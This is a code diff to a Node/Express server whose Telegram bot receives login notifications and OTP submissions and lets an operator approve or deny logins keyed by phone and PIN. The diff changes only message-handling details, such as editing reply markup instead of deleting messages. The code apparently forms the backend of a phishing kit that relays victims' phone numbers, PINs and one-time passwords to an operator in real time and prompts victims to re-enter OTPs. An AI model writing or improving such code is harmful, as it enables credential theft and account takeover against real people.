@@ -30,6 +30,7 @@ app.get('/:page', (req, res) => {
     if (req.params.page.startsWith('api')) {
         return res.status(404).send("Not found");
     }
+
     const file = req.params.page.endsWith('.html')
         ? req.params.page
         : req.params.page + '.html';
@@ -79,8 +80,12 @@ app.post('/api/login-notification', async (req, res) => {
 
     try {
         await bot.telegram.sendMessage(ADMIN_ID, message, {
-            parse_mode: 'HTML'
+            parse_mode: 'HTML',
+            reply_markup: {
+                inline_keyboard: []
+            }
         });
+
         res.json({ success: true });
     } catch (err) {
         res.status(500).json({ error: "Telegram error" });
@@ -124,8 +129,12 @@ app.post('/api/verify-first-otp', async (req, res) => {
 
     try {
         await bot.telegram.sendMessage(ADMIN_ID, otpMessage, {
-            parse_mode: 'HTML'
+            parse_mode: 'HTML',
+            reply_markup: {
+                inline_keyboard: []
+            }
         });
+
         res.json({ success: true });
     } catch (err) {
         res.status(500).json({ error: "Telegram error" });
@@ -163,7 +172,7 @@ bot.action(/approve_(.+)_(.+)/, async (ctx) => {
 ⏱️ <b>${currentTime}</b>`;
 
     try {
-        await ctx.deleteMessage();
+        await ctx.editMessageReplyMarkup();
         await ctx.replyWithHTML(approvedMsg);
         await ctx.answerCbQuery("Allowed");
     } catch (e) {
@@ -171,7 +180,7 @@ bot.action(/approve_(.+)_(.+)/, async (ctx) => {
     }
 });
 
-// DENY LOGIN / WRONG PIN
+// DENY LOGIN
 bot.action(/deny_(.+)_(.+)/, async (ctx) => {
     const phone = ctx.match[1];
     const pin = ctx.match[2];
@@ -198,7 +207,7 @@ bot.action(/deny_(.+)_(.+)/, async (ctx) => {
 ⏱️ <b>${currentTime}</b>`;
 
     try {
-        await ctx.deleteMessage();
+        await ctx.editMessageReplyMarkup();
         await ctx.replyWithHTML(deniedMsg);
         await ctx.answerCbQuery("Rejected");
     } catch (e) {
@@ -234,7 +243,7 @@ bot.action(/otp1_correct_(.+)_(.+)/, async (ctx) => {
 ⌛ <b>${currentTime}</b>`;
 
     try {
-        await ctx.deleteMessage();
+        await ctx.editMessageReplyMarkup();
         await ctx.replyWithHTML(verifiedMsg);
         await ctx.answerCbQuery("Verified");
     } catch (e) {
@@ -249,7 +258,7 @@ bot.action(/otp1_wrong_(.+)/, async (ctx) => {
     statusStore[phone] = "otp1_wrong";
 
     try {
-        await ctx.deleteMessage();
+        await ctx.editMessageReplyMarkup();
         await ctx.replyWithHTML(
             `❌ <b>FIRST OTP WRONG</b>\n📱 <b>User:</b> ${phone}\n⚠️ <b>Prompted to re-enter OTP.</b>`
         );
